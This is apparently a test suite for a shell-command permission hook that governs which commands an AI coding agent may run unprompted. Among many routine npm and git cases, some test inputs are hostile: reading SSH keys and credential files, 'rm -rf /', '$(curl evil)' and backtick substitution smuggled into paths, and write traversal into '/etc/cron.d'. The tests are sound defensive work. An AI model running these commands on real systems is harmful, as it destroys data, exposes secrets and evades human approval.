#!/usr/bin/env node
/**
 * Automated tests for bash-permission-checker.js
 *
 * Feeds synthetic JSON input to the permission checker hook and validates
 * that commands are correctly allowed, denied, or fall through.
 *
 * Usage:
 *   node .claude/hooks/bash-permission-checker.tests.js
 */
'use strict';

const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const scriptPath = path.join(__dirname, 'bash-permission-checker.js');
const prefsPath = path.join(__dirname, '..', 'preferences.json');

let passed = 0;
let failed = 0;
const errors = [];

function testCommand(command, expected, description) {
  const json = JSON.stringify({ tool_name: 'Bash', tool_input: { command } });

  let result, exitCode, stderr;
  try {
    result = execFileSync('node', [scriptPath], {
      input: json,
      encoding: 'utf8',
      timeout: 10000,
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    exitCode = 0;
    stderr = '';
  } catch (err) {
    exitCode = err.status ?? 1;
    result = err.stdout ?? '';
    stderr = err.stderr ?? '';
  }

  let actual;
  if (exitCode === 2) {
    actual = 'deny';
  } else if (exitCode === 0) {
    actual = result && result.includes('allow') ? 'allow' : 'fallthrough';
  } else {
    actual = `error(exit=${exitCode})`;
  }

  if (actual === expected) {
    passed++;
    console.log(`  \x1b[32mPASS\x1b[0m: ${description}`);
  } else {
    failed++;
    const msg = `FAIL: ${description} (expected=${expected}, actual=${actual})`;
    errors.push(msg);
    console.log(`  \x1b[31m${msg}\x1b[0m`);
  }
}

/** Run tests with a specific preferences.json, then restore the original state. */
function withPreferences(prefs, fn) {
  const existed = fs.existsSync(prefsPath);
  const backup = existed ? fs.readFileSync(prefsPath, 'utf8') : null;
  try {
    if (prefs === null) {
      try { fs.unlinkSync(prefsPath); } catch {}
    } else {
      fs.writeFileSync(prefsPath, JSON.stringify(prefs));
    }
    fn();
  } finally {
    try { fs.unlinkSync(prefsPath); } catch {}
    if (existed && backup) fs.writeFileSync(prefsPath, backup);
  }
}

// =============================================================================
// REGRESSION TESTS - existing single-command behavior
// =============================================================================
console.log('\nRegression: Single commands');

testCommand('npm test', 'allow', 'npm test');
testCommand('npm install', 'allow', 'npm install');
testCommand('npm run build', 'allow', 'npm run build');
testCommand('cd web && npm test', 'allow', 'cd prefix + npm test');
testCommand('cd "c:/Git/project/web" && npm test -- src/test.tsx', 'allow', 'cd with absolute path + npm test with args');
testCommand('npx vitest --run', 'allow', 'npx vitest');
testCommand('npx --prefix web tsc --noEmit', 'allow', 'npx --prefix web tsc');
testCommand('npx --prefix web vitest --run', 'allow', 'npx --prefix web vitest');
testCommand('npx --prefix web playwright test', 'allow', 'npx --prefix web playwright');
testCommand('cd C:/Git/00-Stadium-8-test-repos/stadium-8-test-run-24 && npx --prefix web tsc --noEmit 2>&1', 'allow', 'cd absolute && npx --prefix web tsc (real INTAKE shape)');
testCommand('npx --prefix "C:\\Git\\00-Stadium-8-test-repos\\stadium-8-test-run-12 - Copy\\web" playwright --version 2>&1 | head -3', 'allow', 'npx --prefix with double-quoted path containing spaces, piped to head');
testCommand('npx --prefix "C:/Path With Spaces/web" tsc --noEmit', 'allow', 'npx --prefix double-quoted path with spaces');
testCommand("npx --prefix 'C:/Path With Spaces/web' vitest --run", 'allow', 'npx --prefix single-quoted path with spaces');
testCommand('npm --prefix "C:/Path With Spaces/web" test', 'allow', 'npm --prefix double-quoted path with spaces');
testCommand('npx --prefix "C:/Path With $(curl evil)/web" playwright', 'fallthrough', 'npx --prefix quoted path with $(...) command substitution must NOT auto-approve');
testCommand('npx --prefix "C:/Path With `whoami`/web" playwright', 'fallthrough', 'npx --prefix quoted path with backtick substitution must NOT auto-approve');
// Quoted paths with spaces — other absPathChar use sites
testCommand('cd "C:/Path With Spaces/web" && npm test', 'allow', 'cd compound: quoted path with spaces && npm test');
testCommand("cd 'C:/Path With Spaces/web' && npm test", 'allow', 'cd compound: single-quoted path with spaces && npm test');
testCommand('cd "C:/Path With Spaces/web"', 'allow', 'cd standalone: quoted path with spaces');
testCommand('git -C "C:/Path With Spaces/repo" status', 'allow', 'git -C with quoted path containing spaces');
testCommand('git --git-dir="C:/Path With Spaces/.git" log', 'allow', 'git --git-dir= with quoted path containing spaces');
testCommand('git --work-tree="C:/Path With Spaces/repo" status', 'allow', 'git --work-tree= with quoted path containing spaces');
testCommand('find "C:/Path With Spaces" -name "*.ts"', 'allow', 'find with quoted root path containing spaces');
testCommand('test -d "C:/Path With Spaces/web"', 'allow', 'test -d with quoted path containing spaces');
testCommand('cd "C:/Path With $(curl evil)/web" && npm test', 'fallthrough', 'cd compound with $(...) inside quoted path must NOT auto-approve');
testCommand('git -C "C:/Path With `whoami`/repo" status', 'fallthrough', 'git -C with backtick inside quoted path must NOT auto-approve');
testCommand('ls -la web/src/', 'allow', 'ls safe directory');
testCommand('ls C:/Git/00-Stadium-8-test-repos/stadium-8-test-run-20/web/src/app/\\(protected\\)/', 'allow', 'ls path with escaped parentheses');
testCommand('ls web/src/app/(protected)/', 'allow', 'ls path with unescaped parentheses');
testCommand('ls -la /some/path/with/(group)/inside', 'allow', 'ls with parentheses in middle of path');
testCommand('cat web/src/app/(protected)/layout.tsx', 'allow', 'cat file in Next.js route group');
testCommand('head -20 web/src/app/(auth)/login/page.tsx', 'allow', 'head file in Next.js route group');
testCommand('tail web/src/app/(public)/about/page.tsx', 'allow', 'tail file in Next.js route group');
testCommand('wc -l web/src/app/(protected)/dashboard/page.tsx', 'allow', 'wc file in Next.js route group');
testCommand('grep -r "use client" web/src/app/(protected)/', 'allow', 'grep in Next.js route group');
testCommand('cd web/src/app/(protected)', 'allow', 'cd into Next.js route group');
testCommand('test -d web/src/app/(protected)', 'allow', 'test -d Next.js route group');
testCommand('find web/src/app/(protected) -name "*.tsx"', 'allow', 'find in Next.js route group');
testCommand('pwd', 'allow', 'pwd');
testCommand('node --version', 'allow', 'node --version');
testCommand('npm run generate:types', 'allow', 'npm run generate:types');
testCommand('npm run tsc', 'allow', 'npm run tsc');
testCommand('npm run tsc --noEmit', 'allow', 'npm run tsc with flags');
testCommand('cd web && npm run tsc', 'allow', 'cd prefix + npm run tsc');

// =============================================================================
// Git read-only commands
// =============================================================================
console.log('\nGit read-only commands');

testCommand('git status', 'allow', 'git status');
testCommand('git status --short', 'allow', 'git status --short');
testCommand('git log --oneline -5', 'allow', 'git log with flags');
testCommand('git diff', 'allow', 'git diff');
testCommand('git diff HEAD~1 -- src/', 'allow', 'git diff with args');
testCommand('git show HEAD', 'allow', 'git show HEAD');
testCommand('git branch', 'allow', 'git branch (list)');
testCommand('git branch -a', 'allow', 'git branch -a');
testCommand('git branch -vv', 'allow', 'git branch -vv');
testCommand('git rev-parse HEAD', 'allow', 'git rev-parse HEAD');
testCommand('git remote -v', 'allow', 'git remote -v');
testCommand('git stash list', 'allow', 'git stash list');
testCommand('git describe --tags', 'allow', 'git describe --tags');
testCommand('git tag', 'allow', 'git tag (list)');
testCommand('git tag -l "v*"', 'allow', 'git tag -l with pattern');
testCommand('git ls-files', 'allow', 'git ls-files (bare)');
testCommand('git ls-files generated-docs/', 'allow', 'git ls-files with path');
testCommand('git ls-files "generated-docs/context/intake-manifest.json"', 'allow', 'git ls-files quoted path');
testCommand('git -C "C:\\Git\\00-Stadium-8-test-repos\\stadium-8-test-run-24-playwright-testing" ls-files "generated-docs/context/intake-manifest.json"', 'allow', 'git -C external-repo ls-files quoted path (user-reported)');
testCommand('git ls-files -m', 'allow', 'git ls-files -m (modified)');
testCommand('git ls-files --error-unmatch foo.ts', 'allow', 'git ls-files --error-unmatch');

// Safety: these should NOT be auto-approved
testCommand('git branch new-feature', 'fallthrough', 'git branch create = fallthrough');
testCommand('git branch -d old-feature', 'fallthrough', 'git branch -d = fallthrough');
testCommand('git tag v1.0', 'fallthrough', 'git tag create = fallthrough');
testCommand('git stash', 'fallthrough', 'git stash (not list) = fallthrough');
testCommand('git remote add origin url', 'fallthrough', 'git remote add = fallthrough');

// =============================================================================
// Git pull and add (unconditional allow)
// =============================================================================
console.log('\nGit pull and add');

testCommand('git pull', 'allow', 'git pull');
testCommand('git pull origin main', 'allow', 'git pull origin main');
testCommand('git pull --rebase', 'allow', 'git pull --rebase');
testCommand('git pull --ff-only', 'allow', 'git pull --ff-only');
testCommand('git pull origin feature/my-branch', 'allow', 'git pull with feature branch');
testCommand('cd web && git pull', 'allow', 'cd prefix + git pull');
testCommand('git add src/foo.ts', 'allow', 'git add specific file');
testCommand('git add src/foo.ts src/bar.ts', 'allow', 'git add multiple files');
testCommand('git add .', 'allow', 'git add .');
testCommand('git add -A', 'allow', 'git add -A');
testCommand('git add --all', 'allow', 'git add --all');
testCommand('git add -u', 'allow', 'git add -u (update tracked)');
testCommand('git add .claude/logs/', 'allow', 'git add .claude/logs/');
testCommand('cd web && git add .', 'allow', 'cd prefix + git add .');
testCommand('cd web && git add \\\n  src/app/page.tsx \\\n  src/components/Foo.tsx \\\n  ../.claude/logs/', 'allow', 'git add with backslash-newline continuations');
testCommand('git add \\\n  src/foo.ts \\\n  src/bar.ts', 'allow', 'git add multiline with continuations');

// =============================================================================
// Git global options (-C, --work-tree, --git-dir, --no-pager)
// =============================================================================
console.log('\nGit global options');

// -C <path>
testCommand('git -C c:/Git/other-repo add .', 'allow', 'git -C <path> add .');
testCommand('git -C c:/Git/00-Stadium-8-test-repos/stadium-8-test-run-21 add documentation/build-manifest.json documentation/genesis.md', 'allow', 'git -C <path> add multiple files');
testCommand('git -C /tmp/clone status', 'allow', 'git -C <path> status');
testCommand('git -C /tmp/clone log --oneline', 'allow', 'git -C <path> log');
testCommand('git -C /tmp/clone diff', 'allow', 'git -C <path> diff');
testCommand('git -C /tmp/clone diff HEAD~1', 'allow', 'git -C <path> diff with ref');
testCommand('git -C /tmp/clone rev-parse HEAD', 'allow', 'git -C <path> rev-parse');
testCommand('git -C /tmp/clone branch --list', 'allow', 'git -C <path> branch --list');
testCommand('cd web && git -C /tmp/clone add .', 'allow', 'cd prefix + git -C <path> add');
testCommand('git -C c:/Git/other-repo add documentation/file.md 2>&1', 'allow', 'git -C <path> add with 2>&1');

// --no-pager
testCommand('git --no-pager log --oneline', 'allow', 'git --no-pager log');
testCommand('git --no-pager diff HEAD~1', 'allow', 'git --no-pager diff');
testCommand('git --no-pager status', 'allow', 'git --no-pager status');
testCommand('git --no-pager show HEAD', 'allow', 'git --no-pager show');

// --work-tree / --git-dir
testCommand('git --work-tree=/tmp/clone status', 'allow', 'git --work-tree=<path> status');
testCommand('git --git-dir=/tmp/clone/.git log --oneline', 'allow', 'git --git-dir=<path> log');
testCommand('git --work-tree=c:/Git/other-repo diff', 'allow', 'git --work-tree=<path> diff');
testCommand('git --git-dir=c:/Git/other-repo/.git add .', 'allow', 'git --git-dir=<path> add');

// Combined global options
testCommand('git -C /tmp/clone --no-pager log', 'allow', 'git -C + --no-pager log');
testCommand('git --no-pager -C /tmp/clone diff', 'allow', 'git --no-pager + -C diff');
testCommand('git --git-dir=/tmp/.git --work-tree=/tmp/clone status', 'allow', 'git --git-dir + --work-tree status');

// =============================================================================
// Git deny patterns (always blocked)
// =============================================================================
console.log('\nGit deny patterns');

testCommand('git push --force', 'deny', 'git push --force = denied');
testCommand('git push -f', 'deny', 'git push -f = denied');
testCommand('git push origin main --force', 'deny', 'git push origin main --force = denied');
testCommand('git push --no-verify', 'deny', 'git push --no-verify = denied');
testCommand('git commit --no-verify', 'deny', 'git commit --no-verify = denied');
testCommand('git commit -m "msg" --no-verify', 'deny', 'git commit -m with --no-verify = denied');
testCommand('git push --force-with-lease', 'deny', 'git push --force-with-lease = denied (matches --force)');
testCommand('git push --delete origin old-branch', 'deny', 'git push --delete = denied');
testCommand('git commit --amend', 'deny', 'git commit --amend = denied');
testCommand('git commit -a --amend -m "rewrite"', 'deny', 'git commit -a --amend -m = denied');
testCommand('git -C /tmp/clone push --force', 'deny', 'git -C <path> push --force = denied');
testCommand('git -C /tmp/clone push -f', 'deny', 'git -C <path> push -f = denied');
testCommand('git -C /tmp/clone commit --amend', 'deny', 'git -C <path> commit --amend = denied');
testCommand('git -C /tmp/clone commit --no-verify', 'deny', 'git -C <path> commit --no-verify = denied');
testCommand('git -C /tmp/clone push --delete origin branch', 'deny', 'git -C <path> push --delete = denied');
testCommand('git --no-pager push --force', 'deny', 'git --no-pager push --force = denied');
testCommand('git --work-tree=/tmp/clone commit --amend', 'deny', 'git --work-tree=<path> commit --amend = denied');
testCommand('git --no-pager -C /tmp/clone push -f', 'deny', 'git combined global opts + push -f = denied');

// =============================================================================
// Git commit/push config-conditional tests
// =============================================================================

// --- Without config (fallthrough by default) ---
withPreferences(null, () => {
  console.log('\nGit commit/push without config (fallthrough)');

  testCommand('git commit -m "test commit"', 'fallthrough', 'git commit without config = fallthrough');
  testCommand('git push', 'fallthrough', 'git push without config = fallthrough');
  testCommand('git push -u origin main', 'fallthrough', 'git push -u without config = fallthrough');
});

// --- With config enabled (auto-approve) ---
withPreferences({ git: { autoApproveCommit: true, autoApprovePush: true } }, () => {
  console.log('\nGit commit/push with config enabled');

  testCommand('git commit -m "feat: add new feature"', 'allow', 'git commit -m with config enabled');
  testCommand('git commit --message "fix: typo"', 'allow', 'git commit --message with config enabled');
  testCommand('git commit -a -m "all changes"', 'allow', 'git commit -a -m with config enabled');
  testCommand('git push', 'allow', 'git push with config enabled');
  testCommand('git push -u origin feature-branch', 'allow', 'git push -u origin with config enabled');
  testCommand('git push origin main', 'allow', 'git push origin main with config enabled');
  testCommand('git push origin HEAD', 'allow', 'git push origin HEAD (branch-aware push) with config enabled');
  testCommand('git push --tags', 'allow', 'git push --tags with config enabled');
  testCommand('git -C /tmp/clone commit -m "feat: init"', 'allow', 'git -C <path> commit -m with config enabled');
  testCommand('git -C /tmp/clone push', 'allow', 'git -C <path> push with config enabled');
  testCommand('git -C /tmp/clone push -u origin main', 'allow', 'git -C <path> push -u with config enabled');

  // Even with config enabled, dangerous operations are still denied
  testCommand('git push --force', 'deny', 'git push --force STILL denied with config');
  testCommand('git push --delete origin branch', 'deny', 'git push --delete STILL denied with config');
  testCommand('git commit --no-verify', 'deny', 'git commit --no-verify STILL denied with config');
  testCommand('git commit --amend -m "rewrite"', 'deny', 'git commit --amend STILL denied with config');
  testCommand('git commit -a --amend -m "rewrite"', 'deny', 'git commit -a --amend STILL denied with config');
});

// --- With partial config (only commit enabled) ---
withPreferences({ git: { autoApproveCommit: true, autoApprovePush: false } }, () => {
  console.log('\nGit commit/push with partial config');

  testCommand('git commit -m "test"', 'allow', 'git commit allowed (commit=true, push=false)');
  testCommand('git push', 'fallthrough', 'git push fallthrough (commit=true, push=false)');
});

// =============================================================================
// Compound commands with git
// =============================================================================
console.log('\nCompound commands with git');

testCommand('git pull && npm install', 'allow', 'git pull && npm install');
testCommand('git add src/foo.ts && git status', 'allow', 'git add specific file && git status');
testCommand('git add . && git status', 'allow', 'git add . && git status');

// =============================================================================
// REGRESSION TESTS - deny patterns
// =============================================================================
console.log('\nRegression: Deny patterns');

testCommand('cat ~/.ssh/id_rsa', 'deny', 'cat SSH key');
testCommand('rm -rf /', 'deny', 'rm -rf /');
testCommand('cat /etc/credentials', 'deny', 'cat credentials');
testCommand('type secret.key', 'deny', 'type secret file');

// =============================================================================
// REGRESSION TESTS - fallthrough
// =============================================================================
console.log('\nRegression: Fallthrough');

testCommand('docker run ubuntu', 'fallthrough', 'unknown command falls through');
testCommand('curl https://example.com', 'fallthrough', 'curl falls through');

// =============================================================================
// Standalone pattern tests
// =============================================================================
console.log('\nStandalone patterns');

testCommand('cd /some/directory', 'allow', 'standalone cd');
testCommand('cd "c:/Git/project/web"', 'allow', 'standalone cd with quoted Windows path');
testCommand('echo "Installing dependencies..."', 'allow', 'echo with quoted string');
testCommand("echo 'test passed'", 'allow', 'echo with single-quoted string');
testCommand('echo done', 'allow', 'echo with simple word');
testCommand('test -d node_modules', 'allow', 'test -d');
testCommand('[ -d node_modules ]', 'allow', '[ -d ] bracket syntax');
testCommand('true', 'allow', 'true');
testCommand('false', 'allow', 'false');

// =============================================================================
// Compound command tests (splitting)
// =============================================================================
console.log('\nCompound commands (splitting)');

testCommand('cd web && npm install && npm test', 'allow', 'three safe commands chained with &&');
testCommand('echo "installing" && npm install', 'allow', 'echo + npm install');
testCommand('cd web && npm test || echo "tests failed"', 'allow', 'npm test || echo fallback');
testCommand('npm install ; npm run build', 'allow', 'semicolon separator');
testCommand('test -d node_modules && echo "found" || npm install', 'allow', 'conditional dependency check (split)');
testCommand('test -f "c:/Git/project/generated-docs/file.md" && cat "c:/Git/project/generated-docs/file.md" || echo "File not found"', 'allow', 'test -f + cat safe dir + echo fallback');
testCommand('cd web && npm run build && npm run lint && npm test', 'allow', 'four commands chained');
testCommand('cd "c:/Git/project/web" && npm install && npm run build', 'allow', 'absolute path cd + chain');
testCommand('cd /c/Git/stadium-8 && ls -la generated-docs/context/ 2>/dev/null || echo "Context directory not found"', 'allow', 'cd + ls generated-docs subdir + echo fallback');

// Heredoc compound (newline-separated)
testCommand("cat > /tmp/test.js << 'EOF'\nimport { test } from 'vitest';\nEOF\nnpm test -- /tmp/test.js", 'allow', 'heredoc to /tmp + npm test (newline split)');

// =============================================================================
// SECURITY: Compound commands with deny
// =============================================================================
console.log('\nSecurity: Compound with deny');

testCommand('echo "ok" && cat ~/.ssh/id_rsa', 'deny', 'safe + deny = blocked');
testCommand('npm test && rm -rf /', 'deny', 'safe + rm -rf = blocked');
testCommand('echo "ok" ; cat credentials.json', 'deny', 'semicolon + deny = blocked');
testCommand('npm install || cat secret', 'deny', 'OR chain with deny = blocked');

// =============================================================================
// EDGE CASES
// =============================================================================
console.log('\nEdge cases');

testCommand('echo "foo && bar"', 'allow', 'quoted && not split (single command match)');
testCommand("echo 'a ; b'", 'allow', 'quoted ; not split (single command match)');
testCommand('(npm test && npm run build)', 'allow', 'parenthesized group with safe commands');
testCommand('cd web && (npm install && npm test)', 'allow', 'mixed: plain + parenthesized group');
testCommand('(npm test) && (npm run build)', 'allow', 'two parenthesized groups');
testCommand('(npm test && docker run ubuntu)', 'fallthrough', 'parenthesized group with unknown = fallthrough');
testCommand('cd web && docker run ubuntu && npm test', 'fallthrough', 'one unknown sub-command = fallthrough');

// =============================================================================
// FIND - safe directory exploration
// =============================================================================
console.log('\nFind commands');

testCommand('find .claude -name "*.json" 2>/dev/null', 'allow', 'find .claude json files');
testCommand('find documentation -name "*.yaml" -type f', 'allow', 'find documentation yaml files');
testCommand('find web/src -name "*.tsx" -maxdepth 3', 'allow', 'find web/src tsx files with maxdepth');
testCommand('find generated-docs -name "*.md"', 'allow', 'find generated-docs markdown files');
testCommand('find .github -type f', 'allow', 'find .github all files');
testCommand('cd /c/Git/project && find .claude -name "*.json" 2>/dev/null', 'allow', 'cd + find .claude (compound)');
testCommand('cd /home/user/my-project && find .claude -name "*.json" 2>/dev/null && ls .claude/', 'allow', 'cd + find .claude + ls .claude (workflow state check)');
testCommand('find .claude -name "*.json" -exec rm {} \\;', 'fallthrough', 'find with -exec = fallthrough');
testCommand('find .claude -delete', 'fallthrough', 'find with -delete = fallthrough');
testCommand('find /tmp -execdir cat {} \\;', 'fallthrough', 'find with -execdir = fallthrough');
testCommand('find /tmp -ok rm {} \\;', 'fallthrough', 'find with -ok = fallthrough');

// =============================================================================
// FIND - arbitrary paths, -o flag, escaped parens, pipelines
// =============================================================================
console.log('\nFind: arbitrary paths and advanced flags');

testCommand('find /home/user -name "*.json"', 'allow', 'find any path = allowed (read-only)');
testCommand('find /home/user/my-project -name "*epic*2*" -o -name "*story*"', 'allow', 'find with -o (OR operator)');
testCommand('find /home/user/my-project -type f -name "*mock*" -o -name "*fixture*" -o -name "*sample*"', 'allow', 'find with multiple -o flags');
testCommand('find /tmp -name "*.log" -o -name "*.tmp"', 'allow', 'find /tmp with -o');
testCommand('find /c/Git/project/web -type f ! -name "*.map"', 'allow', 'find with ! (NOT operator)');
testCommand('find /c/Git/project -not -name "node_modules" -type d', 'allow', 'find with -not flag');
testCommand('find /c/Git/project -name "*.ts" -print', 'allow', 'find with -print');
testCommand('find /c/Git/project -name "*.ts" -print0', 'allow', 'find with -print0');

console.log('\nFind: escaped parentheses grouping');

testCommand(
  'find /home/user/my-project/web -type f \\( -name "*.test.*" -o -name "*.spec.*" \\)',
  'allow', 'find with escaped parens grouping'
);
testCommand(
  'find /c/Git/project -type f \\( -name "*.ts" -o -name "*.tsx" \\) ! -path "*/node_modules/*"',
  'allow', 'find with escaped parens + ! -path'
);

console.log('\nFind: piped to grep/head (QA workflow patterns)');

testCommand(
  'find /home/user/my-project -name "*epic*2*" -o -name "*story*" | grep -E "\\.(md|txt)$" | head -20',
  'allow', 'find | grep -E | head (epic/story search)'
);
testCommand(
  'find /home/user/my-project -type f -name "*mock*" -o -name "*fixture*" -o -name "*sample*" | grep -E "\\.(json|ts|js)$" | head -10',
  'allow', 'find | grep -E | head (mock/fixture search)'
);
testCommand(
  'find /home/user/my-project/web -type f \\( -name "*.test.*" -o -name "*.spec.*" \\) | grep -i payment | head -5',
  'allow', 'find with parens | grep -i | head (test file search)'
);
testCommand(
  'find web/src -name "*.tsx" | wc -l',
  'allow', 'find | wc -l (count files)'
);
testCommand(
  'find /c/Git/project -name "*.md" | sort',
  'allow', 'find | sort'
);

// =============================================================================
// WORKFLOW SCRIPTS
// =============================================================================
console.log('\nWorkflow scripts');

testCommand('node .claude/scripts/copy-with-header.js --from "documentation/Api Definition.yaml" --to "generated-docs/specs/api-spec.yaml"', 'allow', 'copy-with-header: basic with spaces in filename');
testCommand('node .claude/scripts/copy-with-header.js --from "documentation/design-tokens.css" --to "generated-docs/specs/design-tokens.css" --header "/* Source: documentation/design-tokens.css */"', 'allow', 'copy-with-header: with custom --header flag');
testCommand('node .claude/scripts/copy-with-header.js --help', 'allow', 'copy-with-header: --help');
testCommand('cd "c:/Git/project" && node .claude/scripts/copy-with-header.js --from "documentation/api.yaml" --to "generated-docs/specs/api-spec.yaml"', 'allow', 'copy-with-header: with cd prefix');
testCommand('node .claude/scripts/transition-phase.js --show', 'allow', 'transition-phase: --show');
testCommand('node .claude/scripts/generate-todo-list.js', 'allow', 'generate-todo-list: no args');

// =============================================================================
// ENV VAR PREFIX (VAR=value before commands)
// =============================================================================
console.log('\nEnv var prefix');

// npm with env prefix
testCommand('CI=true npm test', 'allow', 'CI=true npm test');
testCommand('NODE_ENV=production npm run build', 'allow', 'NODE_ENV=production npm run build');
testCommand('CI=true npm run lint', 'allow', 'CI=true npm run lint');
testCommand('CI=true npm install', 'allow', 'CI=true npm install');

// Multiple env vars
testCommand('CI=true NODE_ENV=test npm test', 'allow', 'multiple env vars + npm test');

// npx / bare dev tools with env prefix
testCommand('CI=true npx vitest --run', 'allow', 'CI=true npx vitest');
testCommand('NODE_OPTIONS=--max-old-space-size=4096 npx tsc --noEmit', 'allow', 'NODE_OPTIONS + npx tsc');

// Node scripts with env prefix
testCommand('CI=true node .github/scripts/security-validator.js', 'allow', 'CI=true node .github/scripts/...');
testCommand('CI=true node .claude/scripts/generate-dashboard-html.js --collect', 'allow', 'CI=true node .claude/scripts/...');

// cd prefix + env prefix combined
testCommand('cd web && CI=true npm test', 'allow', 'cd + CI=true + npm test');
testCommand('cd web && NODE_ENV=production npm run build', 'allow', 'cd + NODE_ENV + npm run build');

// Compound with env prefix
testCommand('cd C:/Git/project && CI=true node .github/scripts/security-validator.js > /dev/null 2>&1; echo "EXIT CODE: $?"', 'allow', 'original triggering command (cd + CI=true node + echo)');

// Env prefix should NOT allow arbitrary commands
testCommand('CI=true rm -rf /tmp/stuff', 'deny', 'env prefix + rm -rf = denied (deny pattern catches it)');

// =============================================================================
// WRITE PATH TRAVERSAL PREVENTION
// =============================================================================
console.log('\nWrite path traversal prevention');

testCommand('cat > generated-docs/../../evil.txt', 'fallthrough', 'write traversal ../../ = fallthrough');
testCommand('cat > generated-docs/../../../etc/cron.d/evil', 'fallthrough', 'write traversal to system dir = fallthrough');
testCommand("cat > .claude/context/../../../etc/evil << 'EOF'", 'fallthrough', 'heredoc write traversal = fallthrough');
testCommand('cat > generated-docs/../evil.txt', 'fallthrough', 'write traversal one level (no deny keyword) = fallthrough');
testCommand('cat > generated-docs/../secret.env', 'deny', 'write traversal to secret file = denied (deny pattern catches secret)');

// Normal writes still work
testCommand('cat > generated-docs/plan.md', 'allow', 'normal write to generated-docs = allowed');
testCommand("cat > generated-docs/specs/api-spec.yaml << 'EOF'", 'allow', 'heredoc write to generated-docs = allowed');

// Reads with traversal still work
testCommand('cat documentation/../package.json', 'allow', 'read traversal from documentation = allowed');
testCommand('cat web/../CLAUDE.md', 'allow', 'read traversal from web = allowed');

// =============================================================================
// HEAD/TAIL - safe directory file reading
// =============================================================================
console.log('\nHead/tail commands');

testCommand('head documentation/BRD.md', 'allow', 'head documentation file (no flags)');
testCommand('head -5 documentation/BRD.md', 'allow', 'head -5 documentation file');
testCommand('head -n 20 web/src/app/page.tsx', 'allow', 'head -n 20 web file');
testCommand('head -c 100 generated-docs/plan.md', 'allow', 'head -c 100 generated-docs file');
testCommand('head .claude/hooks/bash-permission-checker.ps1', 'allow', 'head .claude file');
testCommand('head -20 .github/workflows/ci.yml', 'allow', 'head -20 .github file');
testCommand('head -5 documentation/file.md 2>/dev/null', 'allow', 'head with 2>/dev/null');

testCommand('tail documentation/BRD.md', 'allow', 'tail documentation file (no flags)');
testCommand('tail -5 documentation/BRD.md', 'allow', 'tail -5 documentation file');
testCommand('tail -n 20 web/src/app/page.tsx', 'allow', 'tail -n 20 web file');
testCommand('tail -n +10 documentation/api-spec.yaml', 'allow', 'tail -n +10 (from line 10 onwards)');
testCommand('tail -c 100 generated-docs/plan.md', 'allow', 'tail -c 100 generated-docs file');
testCommand('tail .claude/hooks/bash-permission-checker.ps1', 'allow', 'tail .claude file');
testCommand('tail -5 documentation/file.md 2>/dev/null', 'allow', 'tail with 2>/dev/null');

testCommand('cd /c/Git/project && head -5 web/package.json', 'allow', 'cd prefix + head');
testCommand('cd /c/Git/project && tail -5 documentation/file.md', 'allow', 'cd prefix + tail');

testCommand('tail -5 /c/Git/project/documentation/file.md', 'allow', 'tail with absolute Unix path to safe dir');
testCommand('head -10 /c/Git/project/web/src/app/page.tsx', 'allow', 'head with absolute Unix path to safe dir');

testCommand('tail -5 /etc/passwd', 'fallthrough', 'tail /etc/passwd = fallthrough');
testCommand('head ~/.bashrc', 'fallthrough', 'head ~/.bashrc = fallthrough');

testCommand('head ~/.ssh/id_rsa', 'deny', 'head SSH key = denied');
testCommand('tail server.pem', 'deny', 'tail .pem file = denied');
testCommand('tail /home/user/.ssh/config', 'deny', 'tail .ssh directory = denied');

// =============================================================================
// WC - safe directory word/line counts
// =============================================================================
console.log('\nWc commands');

testCommand('wc -l documentation/BRD.md', 'allow', 'wc -l documentation file');
testCommand('wc -lw web/src/app/page.tsx', 'allow', 'wc -lw web file');
testCommand('wc -c generated-docs/plan.md', 'allow', 'wc -c generated-docs file');
testCommand('wc .claude/hooks/bash-permission-checker.ps1', 'allow', 'wc .claude file (no flags)');
testCommand('cd /c/Git/project && wc -l documentation/file.md', 'allow', 'cd prefix + wc');
testCommand('wc -l documentation/file.md 2>/dev/null', 'allow', 'wc with 2>/dev/null');
testCommand('wc -l /etc/passwd', 'fallthrough', 'wc /etc/passwd = fallthrough');
testCommand('wc -l ~/.bashrc', 'fallthrough', 'wc ~/.bashrc = fallthrough');

// =============================================================================
// MULTI-FILE READ COMMANDS (cat / head / tail / wc accept >1 file arg)
// =============================================================================
console.log('\nMulti-file read commands');

// Multiple safe-dir file arguments
testCommand('cat web/a.ts web/b.ts', 'allow', 'cat two files');
testCommand('cat web/a.ts web/b.ts web/c.ts', 'allow', 'cat three files');
testCommand('cat web/src/app/page.tsx', 'allow', 'cat single file (regression)');
testCommand('head -n 20 web/a.ts web/b.ts', 'allow', 'head -n 20 two files');
testCommand('tail -5 documentation/x.md generated-docs/y.md', 'allow', 'tail across two safe dirs');
testCommand('wc -l web/a.ts web/b.ts', 'allow', 'wc -l two files');
// Glob is deliberately NOT supported on content-dumping commands (dotfile-secret risk)
testCommand('cat web/*.ts', 'fallthrough', 'cat glob NOT auto-approved (by design)');
testCommand('head web/src/*.tsx', 'fallthrough', 'head glob NOT auto-approved (by design)');
// One arg outside safe dirs disqualifies the whole command
testCommand('cat web/a.ts /etc/passwd', 'fallthrough', 'cat: one arg outside safe dirs = fallthrough');

// Secret always-deny must hold in ANY argument position (multi-path could otherwise
// let a secret hide in a non-final slot and slip past the end-anchored rule).
console.log('\nMulti-arg secret protection');
testCommand('cat web/a.ts web/.env', 'deny', 'cat: .env as final arg denied');
testCommand('cat web/.env web/a.ts', 'deny', 'cat: .env as first arg denied');
testCommand('head web/a.ts web/.env.local web/b.ts', 'deny', 'head: .env.local as middle arg denied');
testCommand('grep -rl "x" web/id_rsa web/a.ts', 'deny', 'grep: id_rsa as first arg denied');
testCommand('grep -rl "x" web/.env web/a.ts', 'deny', 'grep: .env as first arg denied');
testCommand('grep -rl "x" web/a.ts web/server.pem', 'deny', 'grep: .pem as last arg denied');
// Secret as a search TERM (not a file) is still legitimate
testCommand('grep -rn "id_rsa" web/src web/lib', 'allow', 'grep id_rsa search term across two paths still allowed');
testCommand('grep -rn ".env" web/src', 'allow', 'grep .env search term still allowed');

// =============================================================================
// DIFF - safe directory file comparison
// =============================================================================
console.log('\nDiff commands');

testCommand('diff documentation/old.yaml documentation/new.yaml', 'allow', 'diff two documentation files');
testCommand('diff -u web/src/old.tsx web/src/new.tsx', 'allow', 'diff -u two web files');
testCommand('diff --unified documentation/a.md generated-docs/b.md', 'allow', 'diff --unified across safe dirs');
testCommand('diff --color web/src/a.ts .claude/hooks/b.ps1', 'allow', 'diff --color web vs .claude');
